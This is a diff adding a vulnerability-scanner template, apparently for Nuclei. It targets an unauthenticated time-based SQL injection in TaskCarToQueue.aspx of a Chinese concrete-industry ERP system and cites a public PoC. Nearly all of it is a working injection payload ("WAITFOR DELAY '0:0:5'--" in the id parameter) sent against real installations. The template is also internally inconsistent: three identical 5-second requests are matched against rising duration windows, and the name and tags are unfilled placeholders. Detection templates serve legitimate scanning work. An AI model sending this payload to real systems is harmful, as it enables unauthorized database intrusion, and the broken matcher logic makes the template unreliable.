@@ -1,0 +1,24 @@
+id: shanghun-TaskCarToQueue-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 商混ERP系统 TaskCarToQueue.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息。
+  reference:
+    - https://github.com/wy876/POC/commit/3a4f16b676ac62a239914471a62c8daac33e51fc#diff-2aeb84aab6f285f703da67e3c13a6931d678ea3aa836ae17732ef1c5922293e3R12
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Dispatch/TaskCarToQueue.aspx?action=addqueue&id=%27WAITFOR+DELAY+%270:0:5%27--"
+      - "{{BaseURL}}/Dispatch/TaskCarToQueue.aspx?action=addqueue&id=%27WAITFOR+DELAY+%270:0:5%27--"
+      - "{{BaseURL}}/Dispatch/TaskCarToQueue.aspx?action=addqueue&id=%27WAITFOR+DELAY+%270:0:5%27--"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
